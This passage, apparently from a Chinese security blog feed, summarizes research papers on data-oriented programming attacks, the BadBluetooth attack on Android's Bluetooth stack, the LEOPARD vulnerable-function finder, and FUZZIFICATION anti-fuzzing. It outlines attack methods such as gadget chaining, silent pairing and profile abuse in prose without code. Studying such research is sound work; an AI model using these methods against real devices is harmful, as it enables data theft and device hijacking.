次迭代的存储地址。</p><p>除了上述多轮的攻击，还存在一种非交互式的DOP攻击。这种攻击要求攻击者一次性将攻击载荷输入，为了支持这样的攻击，MINDOP中也保留了两个跳转指令，能实现跳转</p><p><strong>模拟跳转</strong>：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5ungt8s5j30ly0agmym.jpg" alt="image-20200526144557526"></p><p>关键是找到一个合适的变量，可以在每次循环迭代中修改的虚拟 PC 指针，如上述代码，有一个内存指针 <code>pubf -&gt; current</code>，指向了恶意网络输入的缓冲区。在每一次循环迭代中，代码从该缓冲区读取一行，然后在循环体中处理它，因此这个指针可以用来模拟虚拟 PC 指针。对于模拟非条件跳转，攻击者只需要配置好内存，来触发另一个操作 gadgets（如加法、赋值）来改变虚拟 PC 指针的值。</p><h2><span id="pdop-attack-construction">DOP ATTACK CONSTRUCTION</span><a href="#pdop-attack-construction" class="header-anchor">#</a></h2><p>这里总结一下在DOP过程中需要解决的<strong>三个问题</strong>：</p><ul><li>DOP gadgets识别</li><li>DOP gadgets dispatcher识别</li><li>DOP gadgets的拼接利用，在保证程序不崩溃的前提下进行攻击</li></ul><h3><span id="pgadget-identification">Gadget Identification</span><a href="#pgadget-identification" class="header-anchor">#</a></h3><p>一个有用的DOP gadgets需要满足一下<strong>两个条件</strong>：</p><ul><li>满足MINDOP语义。包含加载、存储、运算指令</li><li>在顺序上应该满足加载、运算、存储的顺序。</li></ul><p>使用LLVM实现对DOP gadgets的识别 (<a href="https://github.com/melynx/DOP-StaticAssist" target="_blank" rel="noopener">https://github.com/melynx/DOP-StaticAssist</a>)：LLVM IR提供了比二进制更多的程序语义，同时避免了对程序源码的解析。它还允许对任何有LLVM前端的语言编写的源码进行语言诊断分析。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5v5ipu9kj30jq0budhh.jpg" alt="image-20200526150317786"></p><p><strong>gadgets分类</strong>：根据语义和运算的变量分为三类，并且在使用优先级上全局变量gadgets&gt;函数参数gadgets&gt;局部变量gadgets</p><ul><li>全局变量gadgets：操作全局变量</li><li>函数参数gadgets：操作函数参数</li><li>局部变量gadgets：操作局部变量</li></ul><h3><span id="pdispatcher-identification">Dispatcher Identification</span><a href="#pdispatcher-identification" class="header-anchor">#</a></h3><p>同样也基于LLVM IR 实现（<a href="https://github.com/melynx/DOP-StaticAssist%EF%BC%89" target="_blank" rel="noopener">https://github.com/melynx/DOP-StaticAssist）</a></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5vakdecwj30kw0dcgnu.jpg" alt="image-20200526150809559"></p><h3><span id="pattack-contruction">Attack Contruction</span><a href="#pattack-contruction" class="header-anchor">#</a></h3><p>前提：需要攻击者能够控制第一个gadget加载的地址或者第一个gadget存储的地址</p><p><strong>攻击步骤</strong>：</p><ul><li>Gadget preparation (Semi-automated).：根据一个程序错误，定位到漏洞函数，然后找函数中的gadget dispatcher</li><li>Exploit chain construction (Manual)：将预期的恶意 MinDOP 程序输入，每一个 MinDOP 操作由DOP gadgets 实现，并根据优先级选择合适的 gadgets</li><li>Stitchability verification (Manual)：验证是否成功，如果不行回到上一步</li></ul><h2><span id="pevaluation">Evaluation</span><a href="#pevaluation" class="header-anchor">#</a></h2><p>在Evalution中回答了三个问题：</p><ul><li>DOP gadgets和gadgets dispatcher存在普遍吗？</li><li>能否根据需要链式gadgets达到攻击，是否图灵完备？</li><li>能否突破当期的防御机制（ASLR/DEP）？</li></ul><h3><span id="pq1">Q1</span><a href="#pq1" class="header-anchor">#</a></h3><p>在9个程序中找到了7518个gadgets和5052个gadgets dispatcher，因此是普遍存在的</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5vvxbqqnj316e0ekn1f.jpg" alt="image-20200526152840994"></p><h3><span id="pq2-amp-q3">Q2&amp;Q3</span><a href="#pq2-amp-q3" class="header-anchor">#</a></h3><p>通过对实际漏洞的攻击完成说明，见论文部分</p><h2><span id="pdiscussion">Discussion</span><a href="#pdiscussion" class="header-anchor">#</a></h2><p>DOP目前已经实现了对ASLR、DEP、TASR防御的突破，但也可能可以通过以下方法进行防御</p><ul><li>memory security：通过检测恶意内存损坏来防止出现内存错误。</li><li>Data-Flow Integrity：类似于CFI在控制流完整性上的防御。</li><li>Fine-grained Data-Plane Randomization：细粒度的数据面随机化可以缓解 DOP 攻击，因为 DOP 仍然需要获取某些非控制数据指针的地址。</li><li>Hardware and Software Fault Isolation:内存隔离被广泛用于防止未经授权访问高权限资源，只有合法的代码区域才能访问特定的资源，这样可以防止一些直接的数据破坏攻击。</li></ul><p>总体来说，上述保护措施都会对程序执行带来极大的开销，只是能用来防御，但也需要考量效率问题。</p><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>others</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals(NDSS 2019)</title>
    <url>/93934686.html</url>
    <content><![CDATA[<blockquote><p>本文针对Android 4.2后google开发的蓝牙栈 BlueDroid中存在的粗粒度权限管理问题，提出了并实现了在多版本中的攻击<strong>BadBluetooth</strong>。</p><p>通过将蓝牙设备伪装为键盘，网络接入点和耳机，同时配合Android 恶意app发起静默配对，最终实现控制手机截屏偷取用户隐私数据，劫持通信流量，甚至在锁屏状态下拨打电话等攻击。</p><p>最后，作者在AOSP项目上实现了对应的防御框架</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>本文从逻辑层面对蓝牙进行了系统的研究，包括攻击者模型、设备认证、授权、安全策略等底层假设。</p><p>虽然各类OS都存在蓝牙模块，但考虑到Android系统的普及性，所以主要研究了Android系统蓝牙模块存在的问题。</p><p><strong>贡献</strong>：</p><ul><li>发现了几个Android系统在蓝牙设计和实现中的漏洞，包括设备配置文件修改，粗粒度的认证和授权机制等</li><li>通过这些漏洞，能够在真实环境中实现攻击，造成信息泄露等威胁</li><li>实现了针对这一问题的防御框架并进行了效果评估</li></ul><h2><span id="pbackground">BackGround</span><a href="#pbackground" class="header-anchor">#</a></h2><p>背景介绍中主要介绍了蓝牙的相关知识，之前我也没接触过，所以认真看了下</p><h3><span id="pbluetooth-stack">Bluetooth Stack</span><a href="#pbluetooth-stack" class="header-anchor">#</a></h3><p><strong>蓝牙协议栈的结构</strong>如下图：</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexpausq2uj30lu0f8wg9.jpg" alt="image-20200519133616474" style="zoom:50%"><p>蓝牙栈是一个多层的结构，包括物理层、链路层、中间件层和应用层。下层由蓝牙芯片实现，包含无线控制器、系带控制器等。它们通过主机控制器接口(Host Controller Interface)与操作系统进行通信，中间件层的协议由操作系统实现。</p><p>中间件层的基础层协议是逻辑链路控制适配协议(L2CAP)，它管理两个蓝牙设备之间的连接，实现了QoS、流控、分片和重装机制等功能。在L2CAP的基础上，设计了一系列面向应用的协议。（RFCOMM,SDP等）</p><h3><span id="pbluetooth-profile">Bluetooth Profile</span><a href="#pbluetooth-profile" class="header-anchor">#</a></h3><p>蓝牙配置文件是为了规范不同厂商设备间的通信。在配置文件中包含了引导通信的设置，例如格式、协议等，目前共有30多种标准配置文件。</p><p>最常用的配置文件是耳机配置文件(Headset Profile，HSP)，它规定了蓝牙耳机如何与手机通信。</p><h3><span id="pbluetooth-connetion">Bluetooth Connetion</span><a href="#pbluetooth-connetion" class="header-anchor">#</a></h3><p><strong>蓝牙的连接过程</strong>：</p><ul><li><strong>发现阶段</strong>：扫描发现附近设备，包括设备名字，设备种类，设备profile</li><li><strong>配对阶段</strong>：致辞多种配对模式，一般需要用户输入pin码或者比较数据</li><li><strong>建立连接</strong>：两个设备配对后共享link key，用于加密双方通信的数据</li></ul><h3><span id="pandroid-bluetooth">Android Bluetooth</span><a href="#pandroid-bluetooth" class="header-anchor">#</a></h3><p>之前的Android的是linux的BlueZ栈，但从Android 4.2开始，google实现了自己的蓝牙栈BlueDroid</p><p><strong>BlueDroid中的权限管理</strong>：</p><ul><li>normal-level：无需用户确认，用来请求和接收连接<ul><li>BLUETOOTH</li><li>BLUETOOTH_ADMIN</li></ul></li><li>dangerous-level，：需要用户授权，扫描附近设备，用来获取用户位置<ul><li>ACCESS_COARSE_LOCATION</li><li>ACCESS_FINE_LOCATION</li></ul></li><li>signature-level：需要用户授权，用户需要交互的配对过程<ul><li>BLUETOOTH_PRIVILEGED</li></ul></li></ul><h2><span id="pdesign-weaknesses">Design Weaknesses</span><a href="#pdesign-weaknesses" class="header-anchor">#</a></h2><p>在BlueDroid的设计中，主要存在以下<strong>五个weakness</strong></p><ul><li><p><strong>Weakness #1: Inconsistent Authentication Process on Pro- files.</strong></p><ul><li><p>在配对过程中，配置文件不会被列出。如果在配对后对配置文件进行修改，配对仍然会成立</p></li><li><p>如果连接时为耳机的配置文件，在连接后修改为输入设备的配置文件，那么就能够通过蓝牙进行输入了</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexr098eygj30mo0jowi9.jpg" alt="image-20200519143519758" style="zoom:67%"></li></ul></li><li><p><strong>Weakness #2: Overly Openness to Profile Connection.</strong></p><ul><li>一旦连接建立，主机就会尽力连接到远程设备声称的所有配置文件，而不会向用户解释风险，也不会让用户审核这些连接。即使用户稍后可以在设备详情菜单中断开某些配置文件的连接，但主机不会记住这样的决定。当下次设备配对时，连接将被重新建立。</li></ul></li><li><p><strong>Weakness #3: Deceivable and Vague UI.</strong></p><ul><li>用户浏览配对的蓝牙设备列表时，能够看到名称和图标，但这是能够伪造的</li><li>恶意设备能够修改名称，通过改变CoD(Class of Device)号改变现实的图标</li><li>缺少UI提示蓝牙相关信息。例如，只有两个事件会在通知栏中提示：显示蓝牙已打开，显示已连接远程设备。</li></ul></li><li><p><strong>Weakness #4: Silent Pairing with Device.</strong></p><ul><li>当从设备端发送配对请求时，Android系统会弹出对话框让用户确认。但是，如果由手机发起连接，则可能没有通知。 比如，当设备没有显示能力或输入能力（例如，耳机）</li></ul></li><li><p>**Weakness #5: No Permission Management for Profile. **</p><ul><li>Android通过权限限制应用程序是否可以访问蓝牙设备，但是权限管理太过粗糙</li><li>例如使用BLUETOOTH_ADMIN权限能访问配置文件，虽然在新版中受到了限制，但能通过java反射机制实现</li></ul></li></ul><h2><span id="pattack-overview">ATTACK OVERVIEW</span><a href="#pattack-overview" class="header-anchor">#</a></h2><p><strong>攻击者模型</strong>：</p><ul><li>手机上安装具有Bluetooth权限的恶意app-BLUETOOTH和BLUETOOTH_ADMIN是一般权限 - 无需请求用户同意权限申请</li><li>Bluetooth设备是受攻击者控制的 - XcodeGhost攻击 - 通过设备其他漏洞获得设备权限后插入恶意代码</li></ul><p><strong>攻击流程</strong>：</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexrdkoww2j30le0lymzl.jpg" alt="image-20200519144807796" style="zoom:67%"><ul><li><strong>修改配置文件(#1 #2 #3)</strong>：配对完成后，设备添加其他配置文件，并在攻击完成后删除</li><li><strong>静默连接(#4)</strong>：使用静默方式连接恶意蓝牙设备</li><li><strong>使用敏感的配置文件(#5)</strong>：通过java反射机制操作敏感的配置文件</li></ul><p><strong>攻击步骤</strong>：</p><ul><li>启动恶意app，并保持后台运行，直到监测到手机屏幕关闭时开始攻击</li><li>通过调用BluetoothAdapter.enable静默配对已知地址的恶意设备</li><li>设备等待从app发来的命令，命令通过蓝牙信道传送，或通过网络转发</li><li>接到命令后，设备使用敏感的配置文件，App利用存在的配置文件功能</li><li>设备恢复正常的状态，App使用removeBond取消配对，以免引起注意</li></ul><h2><span id="pattack">Attack</span><a href="#pattack" class="header-anchor">#</a></h2><p>作者根据现有的android profile，总结并实现了攻击，其中HID、PAN和HFP/HSP这三个profile可以被攻击者利用</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexrjiqa52j30mk0eytaq.jpg" alt="image-20200519145350562" style="zoom:67%"><h3><span id="phip-human-interface-device">HIP(Human Interface Device)</span><a href="#phip-human-interface-device" class="header-anchor">#</a></h3><p>例如键盘和鼠标，当HIP接入后，就能向android手机输入内容了</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexs1b978ij30me0c4wg9.jpg" alt="image-20200519151056154" style="zoom:50%"><p><strong>攻击策略</strong>：</p><ul><li>自适应攻击：主要在于识别鼠标位置等，通过手机手机的信息</li><li>输入：通过模拟按键和鼠标点击构造输入</li><li>输出：截屏或者选择文字赋值粘贴进行输出</li></ul><p><strong>危害</strong>：</p><ul><li>信息窃取</li><li>操控系统和App</li><li>盗取密码等敏感内容</li></ul><h3><span id="ppan-persinal-area-networking">PAN(Persinal Area Networking)</span><a href="#ppan-persinal-area-networking" class="header-anchor">#</a></h3><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexsab83k1j30m20pqae0.jpg" alt="image-20200519151935464" style="zoom:67%"><p><strong>危害</strong>：</p><ul><li>网络嗅探和欺骗：由于手机能够通过蓝牙访问互联网，因此可以执行中间人攻击，拦截流量</li><li>偷网络流量：通过蓝牙共享手机网络</li></ul><h3><span id="phf-hands-free">HF(Hands Free)</span><a href="#phf-hands-free" class="header-anchor">#</a></h3><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexsr5jdhrj30mm0dignj.jpg" alt="image-20200519153546573" style="zoom:67%"><p><strong>危害</strong>：</p><ul><li>控制电话，拨打任意号码</li><li>语音命令控制</li></ul><h3><span id="pother-profiles">Other Profiles</span><a href="#pother-profiles" class="header-anchor">#</a></h3><p>除了上述三种profile的攻击，也有一些其他的攻击可以实现，但他们会通知用户批准请求，因此并不隐秘</p><h2><span id="pimplementations-and-evaluations">IMPLEMENTATIONS AND EVALUATIONS</span><a href="#pimplementations-and-evaluations" class="header-anchor">#</a></h2><p>设备：</p><ul><li>树莓派2代（Linux OS）</li><li>CSR8510 USB蓝牙适配器</li><li>Google Pixel 2 （Android 8.1）</li></ul><p>实现：</p><p>Raspberry Pi 2 + 1100 行Python 代码（PyBluez）</p><ul><li>HID attack，raw L2CAP</li><li>PAN attack，tcpdump和dnsmasq</li><li>HFP attack，pulseaudio和ofono</li></ul><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexsvcrl9xj30mw0l2dim.jpg" alt="image-20200519153858880" style="zoom:50%"><p>在测试中，Android5.0到8.1之间的测试版本都攻击成功了</p><h2><span id="pprofile-binding-for-android">PROFILE BINDING FOR ANDROID</span><a href="#pprofile-binding-for-android" class="header-anchor">#</a></h2><p>为了解决发现的问题，作者也提出并实现了相应的防御框架，对profile进行控制</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gexsxb3bhfj30x00raase.jpg" alt="image-20200519154141699" style="zoom:50%"><p>经过检验，这个上层防御框架能够在比正常使用多12%的时间，实现很好的防御</p><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>文中主要对安卓蓝牙协议栈进行了研究，但其实文中提出的weakness中，有的在其他系统中也存在，比如静默匹配，以及提示弹窗问题在大部分系统中都有，可能可以对这一方法进行一些系统的扩展和进一步研究。</p><p>同时，由于蓝牙是基于连接的问题，可以想到常用的wifi，苹果的隔空投送等也可能有问题。</p><p>例如，刚看论文的时候想到了一个wifi重连的问题，虽然没仔细研究，但可能可以根据wifi自动重连的机制，伪造wifi，截取用户的流量，形成中间人攻击</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>mobile_security</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>mobile security</tag>
      </tags>
  </entry>
  <entry>
    <title>LEOPARD: Identifying Vulnerable Code for Vulnerability Assessment through Program Metrics(ICSE 2019)</title>
    <url>/eda43453.html</url>
    <content><![CDATA[<blockquote><p>识别代码中的脆弱点漏洞评估的重要步骤，当前主要的两种方法为：基于度量和基于模式。前者基于机器学习，后者依赖先验知识。本文提出并实现了一个通用、轻量且具有可扩展性的基于程序指标识别漏洞函数的框架 <strong>LEOPARD</strong>，这个框架不需要任何漏洞的先验知识就能识别脆弱点。第一步，通过复杂的程序指标将目标应用的函数分类；第二步，对每个分类中的函数进行排序，并将排位靠前的函数作为漏洞函数。在实际应用中，LEOPARD将20%的函数中识别出了74%的漏洞函数，从PHP，r2等应用中找到了22个新bug，其中8个是新漏洞。</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p><strong>两种方法</strong>：</p><ul><li><strong>Metric-based</strong>:<ul><li>使用监督学习或无监督学习，在文件粒度级别预测漏洞</li><li>缺点：复杂度过高，需要采用复杂的特征，例如词频，依赖关系等</li></ul></li><li><strong>Pattern-based</strong>：<ul><li>Pattern来自于语法或语义抽象，基于先验知识</li><li>检测特定类型的漏洞，例如missing check等</li></ul></li></ul><p><strong>存在的问题</strong>:都基于先验知识，复杂度太高等</p><p><strong>LEOPARD</strong>：</p><ul><li>用于漏洞评估，而不是指出漏洞在哪里（？？？我感觉挺扯淡的这个东西）</li><li>不需要先验知识，使用complexity metrics和vulnerability metrics</li><li>complexity metrics：关注函数复杂性（循环复杂性和循环结构）</li><li>vulnerability metrics：关注函数依赖、指针使用，控制结构的依赖关系</li></ul><p><strong>分为两步</strong>：</p><ul><li>第一步：使用complexity metrics将函数分为多类</li><li>第二步：使用vulnerability metrics对每一类中的函数进行排序，靠前者为可能的漏洞函数</li></ul><h2><span id="pmethodolody">Methodolody</span><a href="#pmethodolody" class="header-anchor">#</a></h2><p>整体框架如下图：</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gewuukspykj30so0bawg0.jpg" alt="image-20200518200240039" style="zoom:50%"><h3><span id="pfunction-binning">Function Binning</span><a href="#pfunction-binning" class="header-anchor">#</a></h3><p>不同的漏洞通常具有不同的复杂程度。为了识别各种复杂程度的漏洞，首先将目标应用程序中的所有函数基于复杂度分为多个种类。每个种类代表不同的复杂程度，供后面的Function Ranking来做预测。这种分级和排序方法旨在避免遗漏低复杂性的易受攻击的功能。</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gewuxtebj2j30ny080my7.jpg" alt="image-20200518200528822" style="zoom:50%"><p>两类特征：</p><ul><li><p>CD1：主要考虑函数中的路径数目</p></li><li><p>CD2：主要考虑循环结构的特征，包括循环数、嵌套循环数和循环的最大嵌套级别。</p></li></ul><h3><span id="pfunction-ranking">Function Ranking</span><a href="#pfunction-ranking" class="header-anchor">#</a></h3><p>根据漏洞的一般特征推导出一组新的漏洞度量，然后对每类中的函数基于度量进行排序，将最上层函数识别为易受攻击的函数。</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gewv3cn54nj30r80dgdih.jpg" alt="image-20200518200832194" style="zoom:50%"><p>主要选用选用了三类特征：</p><ul><li>依赖度量：包括函数参数已经caller和callee之间的依赖</li><li>指针度量：指针算数运算的数量、指针运算中涉及到的变量数目等</li><li>控制流结构度量：最大控制流依赖等</li></ul><h2><span id="papplications-of-leopard">Applications of LEOPARD</span><a href="#papplications-of-leopard" class="header-anchor">#</a></h2><p>由于之前说过LEOPARD不是直接检测漏洞，只是用来预测哪部分很可能出现漏洞，因此这里讲的是对LEPPARD的应用。</p><p>主要是拿LEOPARD的结果去fuzzing，然后发现了22个bug，其中8个是漏洞。</p><h2><span id="pevalutaion">Evalutaion</span><a href="#pevalutaion" class="header-anchor">#</a></h2><p>主要针对以下五个问题进行评估</p><ul><li><p>Q1. Is the binning step before the ranking step reasonable?</p></li><li><p>Q2. Is our binning-and-ranking approach effective, and can it outperform baseline approaches, machine learning-based techniques and some off-the-shelf static scanners?</p></li><li><p>Q3. What is the sensitivity of the metrics to the effectiveness of our framework?</p></li><li><p>Q4. What is the performance overhead (i.e., scalability) of our framework?</p></li><li><p>Q5. What are the potential application scenarios of LEOP- ARD?</p></li></ul><p><strong>Q1</strong>：</p><p>通过在现有的ground truth中使用度量计算分数，可以看到其中确实存在着关系</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gewwk1g28mj317w0g8qb0.jpg" alt="image-20200518210146452"></p><p><strong>Q2</strong>：</p><p>通过和现有的方法对比，主要评估相同百分比的源代码中找到的漏洞占比</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gewwmdok33j317s0hc0ze.jpg" alt="image-20200518210401103"></p><p><strong>Q3</strong>: 通过在原来的度量上去掉某度量和不去掉时的效果进行比较，结论为，去掉后的效果都不如去掉前，每个度量比较敏感，所以总体度量的选择是比较合适的</p><p><strong>Q4</strong>：经过在大项目中的评测，可以适用于大规模处理</p><p><strong>Q5</strong>：主要应用前景还是在进一步的fuzz中，LEOPARD的结果对灰盒fuzz帮助较大</p><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>总体来说，启发式的方法对于分析人员还是很有好处的，分析人员能重点关注启发式的结果，在同样的投入下得到更高的审计产出。</p><p>之前关注的都是直接找漏洞的研究，但确实都需要先验的知识，例如基于0day的patch找1day等。文中方法虽然也是有先验的信息，但不需要大量的数据收集和训练等步骤，可以说是一种通用的启发式方法。</p><p>整体感觉上，是阐述了 越复杂的函数越容易出漏洞的 简明道理。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>FUZZIFICATION: Anti-Fuzzing Techniques(USENIX 2019)</title>
    <url>/14b4d99.html</url>
    <content><![CDATA[<blockquote><p>fuzz作为一种自动化技术，在安全人员手中能够用来发现漏洞，但同时也让hacker能够通过fuzz寻找0day进行攻击。</p><p>为了解决这个问题，本文提出了FUZZIFICATION技术。在实际应用中，对外发布使用FUZZIFICATION处理过的二进制文件，提高hacker fuzz的难度和成本，而对内，由于安全人员拥有未处理过的二进制，使得安全人员能够在hacker fuzz出漏洞前更早的发现漏洞并进行修补。</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>anti-fuzzing的目的类似于二进制中的混淆技术，为了提高攻击者的攻击难度。攻击者虽然能够对FUZZIFICATION处理后的二进制文件进行fuzz，但需要耗费更多的经历(内存、算力、时间等)。而安全人员能够利用这个时间差在攻击者之前寻找漏洞并进行修补。</p><p>有效的anti-fuzzing技术应该满足以下<strong>三个条件</strong>：</p><ul><li>能够有效阻止现有的fuzz工具，在固定时间内发现更少的错误</li><li>受保护的程序在正常状态下仍然能够正常运行</li><li>保护技术不应该被轻易识别并通过patch从程序中删除</li></ul><p>现有的技术无法同时满足这三个目标：</p><ul><li><strong>software obfuscation techniques</strong>：通过混淆阻止fuzz存在以下问题<ul><li>混淆给正常执行带来很大的开销，例如ollvm混淆使执行速度降低了约25倍</li><li>混淆只能减慢单次fuzz的速度，但无法在路径上做文章</li></ul></li><li><strong>software diversification</strong>：软件多样化能缓解攻击但无法隐藏根本漏洞</li></ul><p>本文提出了三种FUZZIFICATION 技术，保护程序抵抗fuzz，分别是SpeedBump（注入delay），BrachTrap（插入jump）和AntiHybrid（阻止其他技术在fuzzing领域的应用），并实现了这三种防御机制。</p><p>为了评估FUZZIFICATION技术，作者在LAVA-M数据集和9个常用程序上做了实验，使用4个流行fuzzer（AFL、HonggFuzz、VUzzer和QSym）对受保护和未保护程序进行实验。</p><p><strong>贡献：</strong></p><ul><li>阐明了<strong>anti-fuzzing方案的新研究方向</strong>。</li><li>提出并实现了<strong>三种有效的FUZZIFICATION方法</strong>。降低fuzzing速度，隐藏路径覆盖范围、阻止动态污点分析和符号执行。</li><li><strong>使用流行的fuzzer和通用基准进行评估</strong>。从真实二进制文件中发现的bug减少了93％，从LAVA-M数据集中发现的bug减少了67.5％，在保持用户指定的开销预算的同时，覆盖率也降低了70.3％。且数据流和控制流分析技术无法轻易移除FUZZIFICATION技术。 源代码：<a href="https://github.com/sslab-gatech/fuzzification" target="_blank" rel="noopener">https://github.com/sslab-gatech/fuzzification</a></li></ul><h2><span id="pbackground-and-problem">Background and Problem</span><a href="#pbackground-and-problem" class="header-anchor">#</a></h2><h3><span id="pfuzzing-techniques">Fuzzing techniques</span><a href="#pfuzzing-techniques" class="header-anchor">#</a></h3><p>为了在fuzz的时候速度更快，一般会从加速单次执行的速度或者减少执行的次数考虑</p><ul><li>单次执行加速：定制的硬件、并行fuzzing</li><li>覆盖率：收集每次执行的代码覆盖率，并优先fuzz触发新分支的输入。一般采用基本块或者分支来统计代码覆盖率</li><li>启发式：使用污点分析等方法帮助fuzz</li></ul><h3><span id="pfuzzification-problem">FUZZIFICATION Problem</span><a href="#pfuzzification-problem" class="header-anchor">#</a></h3><p><strong>问题场景：</strong></p><p>程序开发人员希望由自己或者受信方公开漏洞，而不是黑客，而Anti-Fuzzing技术能够阻碍恶意人员的fuzzing，实现这一目标</p><p><strong>FUZZIFICATION流程：</strong></p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevrm8v2lmj30ua0h20y4.jpg" alt="image-20200517212520008" style="zoom:50%"><ol><li>对外公开使用FUZZIFICATION技术编译生成受保护的二进制文件</li><li>对内使用常规方法编译生成正常的二进制文件</li><li>通过两者fuzz的差距，完成目标</li></ol><p><strong>攻击方设定：</strong></p><ul><li>有限的资源</li><li>只有受FUZZIFICATION保护的二进制文件</li></ul><p><strong>FUZZIFICATION技术目标：</strong></p><ul><li>**Effective：**与原始二进制相比，能够在同样的资源条件下，有效减少发现的bug数量</li><li>**Generic：**对大多数fuzzer适用</li><li>**Efficient：**对常规适用影响小</li><li>**Robust：**能够抵抗试图从二进制文件中删除保护的方法</li></ul><p>下列已有的方法都无法同时满足这四个要求</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevrsukswqj30vg0d8q6c.jpg" alt="image-20200517213140563" style="zoom:50%"><h3><span id="pdesign-overview">Design Overview</span><a href="#pdesign-overview" class="header-anchor">#</a></h3><p>针对上述分析，本文提出了<strong>三种FUZZIFICATION技术：</strong></p><ul><li>**SpeedBump：**在二进制中插入延迟原语，在fuzz时会频繁使用，而正常时不怎么使用</li><li>**BranchTrap：**构造对输入敏感的分支，使得基于覆盖率的fuzzer多走弯路，同时有意使得频繁路径冲突，从而达到让fuzzer无法识别触发新路径的输入</li><li>**AntiHybird：**将显式数据流转换为隐式数据流，防止通过污点分析进行数据流跟踪，插入大量伪造符号在符号执行过程中触发路径爆炸</li></ul><h2><span id="pspeedbump">SpeedBump</span><a href="#pspeedbump" class="header-anchor">#</a></h2><p>**原理：**fuzzer在进行fuzz的时候，会进入类如错误处理的路径，而在正常使用时这些路径并不会经常被执行。所以在这些cold path中注入延迟原语，可以大大降低fuzz执行的速度，且不会对正常执行产生大影响。</p><p><strong>方法：</strong></p><ul><li>正常编译二进制文件，对二进制文件进行测试，找到cold path<ul><li>通过生成基本块的频率曲线，识别cold path</li></ul></li><li>确认注入延迟的cold path数目和延迟大小，使正常执行时开销在预算之内<ul><li>重复操作，调整延迟大小</li></ul></li></ul><p>如果简单的注入sleep等语句，那么可以十分方便的进行去除，所以作者设计了基于CSmith的原语，使用算数运算并和原始代码关联</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevua4kn1sj30ti0ii44l.jpg" alt="image-20200517225729039" style="zoom:50%"><h2><span id="pbranchtrap">BranchTrap</span><a href="#pbranchtrap" class="header-anchor">#</a></h2><p>**原理：**对于使用覆盖率的fuzzer，通过插入大量对输入敏感的分支，使得fuzzer陷入对这些分支的分析中，误导fuzzer</p><p>构造大量条件分支和间接跳转，这些条件分支与输入的字节相关，因此对输入敏感。</p><p>为了使fuzzer关注假分支，作者考虑了以下四个方面</p><ul><li>假分支足够多</li><li>注入的分支和路径对常规运行带来的开销影响小</li><li>路径需要与输入相关</li><li>无法被攻击者轻易去除</li></ul><p><strong>方法：</strong></p><ul><li><strong>CFG Distortion：</strong> 注入跳转表，使用输入作为索引，并且使用类似于ROP的方法，使用gadget<ul><li>优点1：与输入相关联，所以fuzzer不会忽略这些分支</li><li>优点2：轻量级的解析跳转对正常情况下影响小</li><li>优点3：基于ROP方法，增加了去除的难度</li></ul></li><li>**Saturating Fuzzing State：**使fuzzing状态饱和，在很少访问的分支中加入大量确定性分支</li></ul><h2><span id="pantihybird">AntiHybird</span><a href="#pantihybird" class="header-anchor">#</a></h2><p><strong>原理：</strong> 模糊测试的弱点</p><ul><li>符号执行和污点分析需要大量资源</li><li>符号执行容易受到路径爆炸的问题</li><li>污点分析难以跟踪隐式的数据依赖</li></ul><p><strong>方法：</strong></p><ul><li><p>将显示数据流转换为隐式数据流，对抗污点分析</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevun69r6rj30w00ks0zx.jpg" alt="image-20200517231001187"></p></li><li><p>注入多个代码块，有意触发路径爆炸，对抗符号执行</p></li></ul><h2><span id="pevaluation">Evaluation</span><a href="#pevaluation" class="header-anchor">#</a></h2><p>都在论文里，效果可以说是十分不错</p><h2><span id="pge-ren-kan-fa">个人看法</span><a href="#pge-ren-kan-fa" class="header-anchor">#</a></h2><p>论文中提出的三种方法都是针对于当前fuzzer的策略和原理一一提出的方案，短时间内应该很难有更好更全面的的Idea产生了，被UNSNIX接收也是实至名归。</p><p>可以说<code>FUZZIFICATION</code>打开了一个新的研究领域。同时对比于二进制中的混淆和反混淆，可以预见到：如果<code>FUZZIFICATION</code>持续受到研究人员关注的话，那么<code>DE FUZZIFICATION</code> 